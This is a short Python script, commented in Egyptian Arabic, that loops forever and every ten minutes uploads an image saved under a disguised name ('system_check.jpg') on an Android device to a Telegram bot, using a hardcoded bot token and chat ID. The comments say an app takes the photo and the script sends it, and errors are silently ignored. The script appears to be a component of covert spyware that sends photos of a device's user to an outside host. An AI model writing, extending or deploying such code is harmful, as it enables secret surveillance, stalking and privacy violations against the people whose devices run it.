import os, time, requests

# التوكن بتاعك اللي طلعناه من BotFather
BOT_TOKEN = "8465356373:AAH8qYI3VQ9FalFcRM_1jjyNTYJENKGi51M"
# ده رقم مؤقت عشان الرفع يكمل
CHAT_ID = "7537500002" 

def send():
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        # المسار اللي التطبيق هيصور فيه
        img_path = "/sdcard/Download/system_check.jpg"
        if os.path.exists(img_path):
            with open(img_path, "rb") as p:
                requests.post(url, data={"chat_id": CHAT_ID}, files={"photo": p})
    except:
        pass

while True:
    send()
    time.sleep(600) # يصور ويبعت كل 10 دقائق

